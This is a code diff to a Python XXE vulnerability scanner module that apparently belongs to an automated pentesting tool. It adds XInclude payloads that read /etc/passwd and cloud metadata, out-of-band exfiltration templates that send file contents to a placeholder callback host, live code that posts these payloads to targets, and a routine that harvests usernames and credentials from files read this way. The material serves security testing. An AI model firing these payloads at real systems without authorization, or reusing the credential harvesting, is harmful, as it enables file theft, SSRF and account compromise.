@@ -22,18 +22,28 @@ import hashlib
 import random
 import re
 import string
-import time
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from enum import Enum, auto
 from typing import TYPE_CHECKING, Any, Optional
-from urllib.parse import urljoin, urlparse, quote
+from urllib.parse import urljoin
 
 import httpx
 
-from scanning.vuln_scanner import Finding, ScanModule
+from scanning.findings import Finding, VulnType, VulnCategory
+from scanning.vuln_scanner import ScanModule
+from scanning.scan_context import ScanContext
 from utils.logger import get_logger
+from utils.scan_client import get_scan_client
+from utils.network_utils import resolve_base_url
 from utils.rate_limiter import RateLimiter
 from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
+
+# Import OOB Engine for blind XXE detection
+try:
+    from utils.oob_engine import OOBEngine, CallbackType
+    OOB_ENGINE_AVAILABLE = True
+except ImportError:
+    OOB_ENGINE_AVAILABLE = False
 
 if TYPE_CHECKING:
     from core.config_manager import Settings
@@ -56,6 +66,7 @@ class XXEType(Enum):
     SSRF = auto()              # Server-side request forgery
     DOS = auto()               # Denial of service (billion laughs)
     RCE = auto()               # Remote code execution (expect://)
+    XINCLUDE = auto()          # FN-M4: XInclude (works even with DTD disabled)
 
 
 class XMLParser(Enum):
@@ -429,9 +440,11 @@ class XXEScanner(ScanModule):
 ]>
 <root>test</root>''',
 
+        # NOTE: This payload requires hosting an external DTD file for blind XXE
+        # The OOB Engine handles this dynamically in _test_oob_xxe()
         "param_external_dtd": '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "{oob_server}/evil.dtd">
+  <!ENTITY % xxe SYSTEM "http://CALLBACK_HOST/evil.dtd">
   %xxe;
 ]>
 <root>test</root>''',
@@ -446,12 +459,15 @@ class XXEScanner(ScanModule):
     }
     
     # ==================== BLIND/OOB PAYLOADS ====================
-    
+    # NOTE: These are TEMPLATES. The actual OOB testing uses dynamic f-strings
+    # in _test_oob_xxe() with real callback tokens from the OOB Engine.
+    # These templates show the structure for reference/manual testing.
+
     OOB_PAYLOADS = {
         "oob_http": '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{oob_server}/?x=%file;'>">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK_HOST/TOKEN?x=%file;'>">
   %eval;
   %exfil;
 ]>
@@ -459,7 +475,7 @@ class XXEScanner(ScanModule):
 
         "oob_dns": '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://{marker}.{oob_domain}/xxe">
+  <!ENTITY % xxe SYSTEM "http://TOKEN.callback.example.com/xxe">
   %xxe;
 ]>
 <root>test</root>''',
@@ -467,7 +483,7 @@ class XXEScanner(ScanModule):
         "oob_ftp": '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://{oob_server}/%file;'>">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://CALLBACK_HOST/%file;'>">
   %eval;
   %exfil;
 ]>
@@ -475,7 +491,7 @@ class XXEScanner(ScanModule):
 
         "oob_gopher": '''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "gopher://{oob_server}:70/_XXE_TEST">
+  <!ENTITY xxe SYSTEM "gopher://CALLBACK_HOST:70/_XXE_TEST">
 ]>
 <root>&xxe;</root>''',
     }
@@ -600,6 +616,59 @@ class XXEScanner(ScanModule):
 <root>&xxe;</root>''',
     }
     
+    # ==================== XINCLUDE PAYLOADS ====================
+    # FN-M4 FIX: XInclude can bypass XXE protections that only disable DTDs
+
+    XINCLUDE_PAYLOADS = {
+        # Basic XInclude - works even with DTD disabled
+        "xinclude_basic": '''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</root>''',
+
+        # XInclude with fallback
+        "xinclude_fallback": '''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text">
+    <xi:fallback>fallback content</xi:fallback>
+  </xi:include>
+</root>''',
+
+        # XInclude for Windows
+        "xinclude_windows": '''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///c:/windows/win.ini" parse="text"/>
+</root>''',
+
+        # XInclude SSRF
+        "xinclude_ssrf": '''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
+</root>''',
+
+        # XInclude with xpointer (can extract portions of files)
+        "xinclude_xpointer": '''<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" xpointer="xpointer(//*)" parse="xml"/>
+</root>''',
+
+        # XInclude in SOAP
+        "xinclude_soap": '''<?xml version="1.0" encoding="UTF-8"?>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
+               xmlns:xi="http://www.w3.org/2001/XInclude">
+  <soap:Body>
+    <xi:include href="file:///etc/passwd" parse="text"/>
+  </soap:Body>
+</soap:Envelope>''',
+
+        # XInclude in SVG
+        "xinclude_svg": '''<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text"/>
+</svg>''',
+    }
+
     # ==================== FILE INDICATORS ====================
     
     FILE_INDICATORS = {
@@ -636,12 +705,37 @@ class XXEScanner(ScanModule):
         "DTD",
     ]
     
-    def __init__(self, settings: Settings) -> None:
-        super().__init__(settings)
-        self.timeout = settings.timeouts.request_timeout
+    def __init__(
+        self,
+        settings: "Settings",
+        *,  # Force keyword args for DI parameters
+        oob_engine: Any = None,  # Phase 8: Optional injected OOBEngine
+    ) -> None:
+        # Phase 8: Pass injected dependencies to base class
+        super().__init__(settings, oob_engine=oob_engine)
+        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
         self.detected_waf: Optional[WAFType] = None
         self.detected_parser: XMLParser = XMLParser.UNKNOWN
         self.findings: list[XXEFinding] = []
+
+        # OOB Engine for blind XXE detection
+        # Phase 8: Use injected OOB engine if available, otherwise create one
+        self._oob_engine = self.get_oob_engine()  # From ScanModule base class
+        self._scan_id = ""
+
+        if self._oob_engine is None and OOB_ENGINE_AVAILABLE:
+            try:
+                self._oob_engine = OOBEngine(
+                    callback_host="127.0.0.1",
+                    callback_port=8888,
+                    callback_domain="oob.phantom.local",
+                    start_server=False,
+                )
+                logger.debug("[XXE] OOB Engine initialized locally for blind detection")
+            except Exception as e:
+                logger.debug(f"[XXE] OOB Engine initialization failed: {e}")
+        elif self._oob_engine is not None:
+            logger.debug("[XXE] Using injected OOB Engine for blind detection")
     
     def _generate_marker(self) -> str:
         """Generate unique marker for OOB detection."""
@@ -671,46 +765,191 @@ class XXEScanner(ScanModule):
         12. Cross-validation
         """
         self.findings = []
-        
-        base_url = f"https://{host}" if not host.startswith("http") else host
-        
-        forms = asset_data.get("forms", [])
-        urls = asset_data.get("urls", [])
-        
-        async with httpx.AsyncClient(
+
+        base_url = resolve_base_url(host)
+
+        if isinstance(asset_data, dict):
+            forms = asset_data.get("forms", [])
+        if isinstance(asset_data, dict):
+            urls = asset_data.get("urls", [])
+
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._ctx.log_context_status()
+        self._auth_headers = self._ctx.auth_headers
+        if self._ctx.has_auth:
+            logger.info(f"[XXE] Using authenticated session ({self._ctx.auth_method})")
+
+        # ENHANCEMENT 2026-02-20: Get endpoint_params and vuln_type_hints from metadata discovery
+        # This enables testing of endpoints discovered from /scanner, /api-docs, etc.
+        endpoint_params: dict[str, list[str]] = {}
+        vuln_type_hints: dict[str, list[str]] = {}
+        if isinstance(asset_data, dict):
+            endpoint_params = asset_data.get("endpoint_params", {})
+            vuln_type_hints = asset_data.get("vuln_type_hints", {})
+        if endpoint_params:
+            logger.info(f"[XXE] Received {len(endpoint_params)} endpoints with params from metadata discovery")
+
+        # Add metadata-discovered endpoints with XXE hints
+        xxe_hint_types = {"XXE", "XML_EXTERNAL_ENTITY", "XML_INJECTION"}
+        for ep_url, hints in vuln_type_hints.items():
+            if not any(h in xxe_hint_types for h in hints):
+                continue
+            # Normalize URL
+            if ep_url.startswith("/"):
+                full_url = f"{base_url}{ep_url}"
+            elif not ep_url.startswith("http"):
+                full_url = f"{base_url}/{ep_url}"
+            else:
+                full_url = ep_url
+            # Add as a form target (XXE requires POST with XML body)
+            forms.append({"action": full_url, "method": "POST", "metadata_discovered": True})
+            urls.append(full_url)
+            logger.debug(f"[XXE] Adding metadata endpoint: {full_url}")
+        if vuln_type_hints:
+            xxe_hinted = sum(1 for hints in vuln_type_hints.values() if any(h in xxe_hint_types for h in hints))
+            if xxe_hinted > 0:
+                logger.info(f"[XXE] Added {xxe_hinted} endpoints with XXE hints")
+
+        # SHARED FINDINGS STORE: Cross-module targeting
+        if isinstance(asset_data, dict):
+            shared_store = asset_data.get("shared_findings_store")
+        if shared_store:
+            from utils.shared_findings_store import VulnType
+            # XXE can chain with SSRF and file-related vulnerabilities
+            for vtype in [VulnType.SSRF, VulnType.LFI]:
+                for sf in shared_store.get_findings_by_type(vtype):
+                    if sf.endpoint:
+                        forms.append({"action": sf.endpoint, "method": "POST"})
+                        logger.debug(f"[XXE] Cross-module target from {sf.module}: {sf.endpoint}")
+
+        async with get_scan_client(
             timeout=self.timeout,
-            verify=False,
-            follow_redirects=True
+            follow_redirects=True,
+            custom_headers=self._auth_headers,
         ) as client:
             
+            # TIMEOUT-FIX 2026-02-12: Add timeout for each phase to prevent hanging
+            # PERF-FIX 2026-02-12: Reduced from 15s to 10s per phase for faster completion
+            phase_timeout = 10.0  # Max 10s per phase
+
             # Phase 1: WAF Detection
-            self.detected_waf = await self._detect_waf(client, base_url, rate_limiter)
-            if self.detected_waf:
-                logger.info(f"WAF detected: {self.detected_waf.name}")
-            
+            try:
+                self.detected_waf = await asyncio.wait_for(
+                    self._detect_waf(client, base_url, rate_limiter),
+                    timeout=phase_timeout
+                )
+                if self.detected_waf:
+                    logger.info(f"WAF detected: {self.detected_waf.name}")
+            except asyncio.TimeoutError:
+                logger.debug("[XXE] WAF detection timeout")
+                self.detected_waf = None
+
             # Phase 2: Find XML endpoints
-            xml_endpoints = await self._find_xml_endpoints(client, base_url, rate_limiter)
-            logger.info(f"Found {len(xml_endpoints)} potential XML endpoints")
-            
+            try:
+                xml_endpoints = await asyncio.wait_for(
+                    self._find_xml_endpoints(client, base_url, rate_limiter),
+                    timeout=phase_timeout
+                )
+                logger.info(f"Found {len(xml_endpoints)} potential XML endpoints")
+            except asyncio.TimeoutError:
+                logger.debug("[XXE] Endpoint discovery timeout")
+                xml_endpoints = []
+
             # Phase 3: Test endpoints for XXE
-            for endpoint in xml_endpoints[:20]:
-                await self._test_endpoint(client, base_url, endpoint, rate_limiter)
-            
+            # PERF-FIX 2026-02-12: Reduced from 20 to 8 endpoints (XXE is rare, most apps don't accept XML)
+            # Also reduced per-endpoint timeout to 3s since we test fewer payloads
+            max_endpoints = 8
+            endpoint_timeout = 3.0
+
+            for endpoint in xml_endpoints[:max_endpoints]:
+                try:
+                    await asyncio.wait_for(
+                        self._test_endpoint(client, base_url, endpoint, rate_limiter),
+                        timeout=endpoint_timeout
+                    )
+                except asyncio.TimeoutError:
+                    logger.debug(f"[XXE] Endpoint timeout: {endpoint}")
+
             # Phase 4: Test forms
-            await self._test_forms(client, base_url, forms, rate_limiter)
-            
+            try:
+                await asyncio.wait_for(
+                    self._test_forms(client, base_url, forms, rate_limiter),
+                    timeout=phase_timeout
+                )
+            except asyncio.TimeoutError:
+                logger.debug("[XXE] Forms test timeout")
+
             # Phase 5: Test SOAP services
-            await self._test_soap(client, base_url, rate_limiter)
-            
+            try:
+                await asyncio.wait_for(
+                    self._test_soap(client, base_url, rate_limiter),
+                    timeout=phase_timeout
+                )
+            except asyncio.TimeoutError:
+                logger.debug("[XXE] SOAP test timeout")
+
             # Phase 6: Test SVG upload points
-            await self._test_svg_endpoints(client, base_url, urls, rate_limiter)
-        
+            try:
+                await asyncio.wait_for(
+                    self._test_svg_endpoints(client, base_url, urls, rate_limiter),
+                    timeout=phase_timeout
+                )
+            except asyncio.TimeoutError:
+                logger.debug("[XXE] SVG test timeout")
+
+            # Phase 7: Test blind/OOB XXE (if no findings yet or need confirmation)
+            # PERF-FIX 2026-02-12: Reduced from 10 to 5 endpoints for OOB tests
+            if len(self.findings) == 0 or all(f.confidence < 80 for f in self.findings):
+                try:
+                    await asyncio.wait_for(
+                        self._test_oob_xxe(client, base_url, xml_endpoints[:5], rate_limiter),
+                        timeout=phase_timeout
+                    )
+                except asyncio.TimeoutError:
+                    logger.debug("[XXE] OOB test timeout")
+
         # Convert findings to dict format
         findings_dicts = []
         for f in self.findings:
             if f.confidence >= self.MIN_CONFIDENCE_THRESHOLD:
                 findings_dicts.append(self._finding_to_dict(f))
-        
+
+        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
+        try:
+            from utils.shared_findings_store import SharedFindingsStore, VulnType
+            store = SharedFindingsStore.get_instance()
+            for f in findings_dicts:
+                if isinstance(f, dict):
+                    metadata = f.get("metadata", {})
+                    if isinstance(asset_data, dict):
+                        endpoint = f.get("matched_at") or metadata.get("url", "")
+                    if isinstance(asset_data, dict):
+                        file_content = metadata.get("file_content", "")
+
+                    finding_data = {
+                        "type": VulnType.XXE,
+                        "endpoint": endpoint,
+                        "severity": f.get("severity", "HIGH"),
+                        "file_content": file_content,
+                    }
+
+                    # Adicionar parâmetro apenas se 'data' for dict
+                    if isinstance(asset_data, dict):
+                        finding_data["parameter"] = metadata.get("param", "")
+
+                    await store.add_finding(finding_data, module="xxe")
+
+
+                    # THEME-4: Extract and share data from XXE file reads
+                    if file_content:
+                        await self._share_xxe_extracted_data(file_content, endpoint, store)
+
+            if findings_dicts:
+                logger.debug(f"[XXE] Shared {len(findings_dicts)} findings to cross-module store")
+        except Exception as e:
+            logger.debug(f"[XXE] Could not share findings: {e}")
+
         return {
             "module": self.name,
             "version": XXE_SCANNER_VERSION,
@@ -816,35 +1055,38 @@ class XXEScanner(ScanModule):
         except Exception:
             return
         
-        # Test classic XXE payloads
-        for payload_name, payload in list(self.CLASSIC_PAYLOADS.items())[:6]:
+        # PERF-FIX 2026-02-12: Reduced payloads per endpoint for faster scanning
+        # Test classic XXE payloads (3 instead of 6 - most important variants)
+        for payload_name, payload in list(self.CLASSIC_PAYLOADS.items())[:3]:
             finding = await self._test_payload(
                 client, endpoint, payload, payload_name,
                 XXEType.CLASSIC, "file://", baseline_text, rate_limiter
             )
             if finding:
                 self.findings.append(finding)
-                break  # Found vulnerability, move on
-        
-        # Test PHP wrappers
-        for payload_name, payload in list(self.PHP_PAYLOADS.items())[:3]:
-            finding = await self._test_payload(
-                client, endpoint, payload, payload_name,
-                XXEType.CLASSIC, "php://", baseline_text, rate_limiter
-            )
-            if finding:
-                self.findings.append(finding)
-                break
-        
-        # Test SSRF payloads
-        for payload_name, payload in list(self.SSRF_PAYLOADS.items())[:4]:
-            finding = await self._test_payload(
-                client, endpoint, payload, payload_name,
-                XXEType.SSRF, "http://", baseline_text, rate_limiter
-            )
-            if finding:
-                self.findings.append(finding)
-                break
+                break  # Found XXE, stop testing this endpoint
+
+        # Test PHP wrappers (only if no classic XXE found)
+        if not any(f.url == endpoint for f in self.findings):
+            for payload_name, payload in list(self.PHP_PAYLOADS.items())[:2]:
+                finding = await self._test_payload(
+                    client, endpoint, payload, payload_name,
+                    XXEType.CLASSIC, "php://", baseline_text, rate_limiter
+                )
+                if finding:
+                    self.findings.append(finding)
+                    break  # Found PHP XXE, stop testing
+
+        # Test SSRF payloads (only if nothing found yet)
+        if not any(f.url == endpoint for f in self.findings):
+            for payload_name, payload in list(self.SSRF_PAYLOADS.items())[:2]:
+                finding = await self._test_payload(
+                    client, endpoint, payload, payload_name,
+                    XXEType.SSRF, "http://", baseline_text, rate_limiter
+                )
+                if finding:
+                    self.findings.append(finding)
+                    break
         
         # Test error-based if nothing found
         if not any(f.url == endpoint for f in self.findings):
@@ -867,7 +1109,19 @@ class XXEScanner(ScanModule):
                     finding.waf_bypassed = True
                     self.findings.append(finding)
                     break
-    
+
+        # FN-M4 FIX: Test XInclude - works even when DTD processing is disabled
+        if not any(f.url == endpoint for f in self.findings):
+            for payload_name, payload in self.XINCLUDE_PAYLOADS.items():
+                finding = await self._test_payload(
+                    client, endpoint, payload, payload_name,
+                    XXEType.XINCLUDE, "xinclude://", baseline_text, rate_limiter
+                )
+                if finding:
+                    finding.metadata["attack_vector"] = "XInclude"
+                    self.findings.append(finding)
+                    # FN-C1 FIX: Don't break - test multiple XInclude variants
+
     async def _test_payload(
         self,
         client: httpx.AsyncClient,
@@ -1189,7 +1443,8 @@ class XXEScanner(ScanModule):
             urljoin(base_url, "/avatar"),
         ])
         
-        for endpoint in svg_endpoints[:5]:
+        # FN-C2 FIX: Test more SVG endpoints (was [:5])
+        for endpoint in svg_endpoints[:15]:
             for payload_name, payload in self.SVG_PAYLOADS.items():
                 await rate_limiter.acquire()
                 
@@ -1223,7 +1478,133 @@ class XXEScanner(ScanModule):
                         
                 except Exception as e:
                     logger.debug(f"SVG XXE test error: {e}")
-    
+
+    async def _test_oob_xxe(
+        self,
+        client: httpx.AsyncClient,
+        base_url: str,
+        xml_endpoints: list[str],
+        rate_limiter: RateLimiter,
+    ) -> None:
+        """
+        Test for blind/OOB XXE using callback-based detection.
+
+        Uses the OOB Engine to generate payloads with unique tokens and
+        verifies callbacks to confirm blind XXE vulnerabilities.
+        """
+        if not self._oob_engine or not OOB_ENGINE_AVAILABLE:
+            logger.debug("[XXE] OOB Engine not available, skipping blind XXE tests")
+            return
+
+        logger.debug(f"[XXE] Testing blind/OOB XXE on {len(xml_endpoints)} endpoints")
+
+        for endpoint in xml_endpoints[:10]:
+            # Generate OOB payloads with tracking tokens
+            oob_payloads = self._oob_engine.generate_oob_payloads(
+                scan_id=self._scan_id or hashlib.md5(base_url.encode()).hexdigest()[:8],
+                payload_type="xxe",
+                target_url=endpoint,
+                parameter="xml_body",
+            )
+
+            for oob_payload in oob_payloads[:2]:  # Test HTTP and DNS variants
+                await rate_limiter.acquire()
+
+                token = oob_payload["oob_token"]
+                callback_host = oob_payload["callback_host"]
+                callback_domain = oob_payload["callback_domain"]
+
+                # Build OOB XXE payload using our templates
+                oob_xxe_http = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/hostname">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{callback_host}/{token}?x=%file;'>">
+  %eval;
+  %exfil;
+]>
+<root>test</root>'''
+
+                oob_xxe_dns = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://{token}.{callback_domain}/xxe">
+  %xxe;
+]>
+<root>test</root>'''
+
+                # Test HTTP-based OOB
+                for payload_name, payload in [("oob_http", oob_xxe_http), ("oob_dns", oob_xxe_dns)]:
+                    try:
+                        response = await client.post(
+                            endpoint,
+                            content=payload,
+                            headers={
+                                "Content-Type": "application/xml",
+                                "Accept": "application/xml, text/xml, */*",
+                            }
+                        )
+
+                        # Wait briefly for OOB callback
+                        await asyncio.sleep(1.0)
+
+                        # Check if callback was received
+                        if self._oob_engine.check_callback(token):
+                            callback_evidence = self._oob_engine.get_callback_evidence(token)
+
+                            xxe_type = XXEType.OOB_HTTP if "http" in payload_name else XXEType.OOB_DNS
+
+                            self.findings.append(XXEFinding(
+                                url=endpoint,
+                                xxe_type=xxe_type,
+                                payload=payload_name,
+                                protocol="http://" if xxe_type == XXEType.OOB_HTTP else "dns://",
+                                parser=self.detected_parser,
+                                content_format=ContentFormat.XML,
+                                detection_method="oob_callback",
+                                evidence=[
+                                    f"OOB callback received for token: {token}",
+                                    f"Callback type: {callback_evidence.get('first_callback', {}).get('type', 'unknown') if callback_evidence else 'unknown'}",
+                                    f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
+                                    "Blind XXE CONFIRMED via out-of-band channel",
+                                ],
+                                confidence=95,
+                                waf_detected=self.detected_waf,
+                            ))
+
+                            logger.info(f"🎯 [XXE] Blind XXE CONFIRMED via OOB callback at {endpoint}")
+                            return  # Found confirmed blind XXE
+
+                    except Exception as e:
+                        logger.debug(f"OOB XXE test error: {e}")
+
+            # Wait a bit longer for delayed callbacks
+            await asyncio.sleep(2.0)
+
+            # Check tokens one more time for delayed responses
+            for oob_payload in oob_payloads[:2]:
+                token = oob_payload["oob_token"]
+                if self._oob_engine.check_callback(token):
+                    callback_evidence = self._oob_engine.get_callback_evidence(token)
+
+                    self.findings.append(XXEFinding(
+                        url=endpoint,
+                        xxe_type=XXEType.OOB_HTTP,
+                        payload="oob_delayed",
+                        protocol="http://",
+                        parser=self.detected_parser,
+                        content_format=ContentFormat.XML,
+                        detection_method="oob_callback_delayed",
+                        evidence=[
+                            f"Delayed OOB callback received for token: {token}",
+                            f"Time to callback: {callback_evidence.get('time_to_callback_ms', 'N/A')}ms" if callback_evidence else "",
+                            "Blind XXE CONFIRMED via delayed out-of-band response",
+                        ],
+                        confidence=90,
+                        waf_detected=self.detected_waf,
+                    ))
+
+                    logger.info(f"🎯 [XXE] Blind XXE CONFIRMED via delayed OOB callback at {endpoint}")
+                    return
+
     def _finding_to_dict(self, finding: XXEFinding) -> dict[str, Any]:
         """Convert XXEFinding to Finding dict."""
         severity = "CRITICAL"
@@ -1246,6 +1627,7 @@ class XXEScanner(ScanModule):
             XXEType.SSRF: "SSRF via XXE",
             XXEType.RCE: "Remote Code Execution via XXE",
             XXEType.DOS: "DoS via XXE (Billion Laughs)",
+            XXEType.XINCLUDE: "XInclude XXE (DTD-Disabled Bypass)",  # FN-M4
         }.get(finding.xxe_type, "XXE")
         
         # Build evidence with file content if available
@@ -1258,7 +1640,8 @@ class XXEScanner(ScanModule):
             evidence_list.append(f"Extracted content: {finding.file_content[:200]}...")
 
         return Finding(
-            type="xxe",
+            vuln_type=VulnType.XXE,
+                        category=VulnCategory.INJECTION,
             name=f"XML External Entity (XXE) - {xxe_type_desc}",
             severity=severity,
             description=(
@@ -1270,10 +1653,10 @@ class XXEScanner(ScanModule):
                 f"Confidence: {finding.confidence}%."
             ),
             host=finding.url,
-            matched_at=finding.url,
+            endpoint=finding.url,
             evidence=evidence_list,
             cvss_score=cvss,
-            cwe="CWE-611",
+            cwe_id="CWE-611",
             metadata={
                 "file_content": finding.file_content[:500] if finding.file_content else None,
                 "file_disclosed": finding.file_disclosed,
@@ -1296,3 +1679,92 @@ class XXEScanner(ScanModule):
                 "https://portswigger.net/web-security/xxe",
             ],
         ).to_dict()
+
+    # =========================================================================
+    # THEME-4: Cross-module data sharing
+    # =========================================================================
+
+    async def _share_xxe_extracted_data(
+        self,
+        file_content: str,
+        source_endpoint: str,
+        store: Any,  # SharedFindingsStore - avoid circular import
+    ) -> None:
+        """
+        Extract and share data from XXE-read files for cross-module consumption.
+
+        THEME-4 FIX: XXE can read files like LFI - share the extracted data.
+        """
+        import re
+
+        try:
+            # Extract usernames from /etc/passwd
+            if ":x:" in file_content or ":/bin/" in file_content:
+                usernames = []
+                for line in file_content.split("\n"):
+                    if ":" in line and not line.startswith("#"):
+                        parts = line.split(":")
+                        if len(parts) >= 3:
+                            username = parts[0].strip()
+                            shell = parts[-1].strip() if len(parts) >= 7 else ""
+                            if username and not any(x in shell for x in ["nologin", "false", "sync"]):
+                                usernames.append(username)
+
+                if usernames:
+                    await store.add_extracted_data(
+                        data_type="usernames",
+                        values=usernames[:50],
+                        source_module="xxe_scanner",
+                        source_endpoint=source_endpoint,
+                        context={"file": "/etc/passwd", "extraction_method": "xxe"},
+                    )
+                    logger.info(f"[THEME-4/XXE] Shared {len(usernames)} usernames from /etc/passwd")
+
+            # Extract credentials from config content
+            config_patterns = [
+                (r"(?i)password['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "password"),
+                (r"(?i)user(?:name)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "username"),
+                (r"(?i)secret(?:_key)?['\"]?\s*[=:]\s*['\"]?([^'\"\s;]+)", "secret"),
+            ]
+
+            extracted = {}
+            for pattern, label in config_patterns:
+                matches = re.findall(pattern, file_content)
+                for match in matches[:5]:
+                    if match and len(match) > 3:
+                        if label not in extracted:
+                            extracted[label] = []
+                        extracted[label].append(match)
+
+            if "username" in extracted and "password" in extracted:
+                creds = []
+                for i, username in enumerate(extracted["username"][:5]):
+                    password = extracted["password"][i] if i < len(extracted["password"]) else None
+                    if password:
+                        creds.append({"username": username, "password_hash": password})
+
+                if creds:
+                    await store.add_extracted_data(
+                        data_type="credentials",
+                        values=creds,
+                        source_module="xxe_scanner",
+                        source_endpoint=source_endpoint,
+                        context={"extraction_method": "xxe_config_read"},
+                    )
+                    logger.info(f"[THEME-4/XXE] Shared {len(creds)} credentials from config")
+
+            # Register chain opportunity
+            await store.add_extracted_data(
+                data_type="chain_opportunities",
+                values=[{
+                    "chain_type": "xxe_to_ssrf",
+                    "description": "XXE can read files and potentially make SSRF requests",
+                    "file_content_preview": file_content[:100] if file_content else "",
+                }],
+                source_module="xxe_scanner",
+                source_endpoint=source_endpoint,
+                context={"suggested_modules": ["ssrf", "lfi", "ssti"]},
+            )
+
+        except Exception as e:
+            logger.debug(f"[THEME-4/XXE] Failed to share extracted data: {e}")
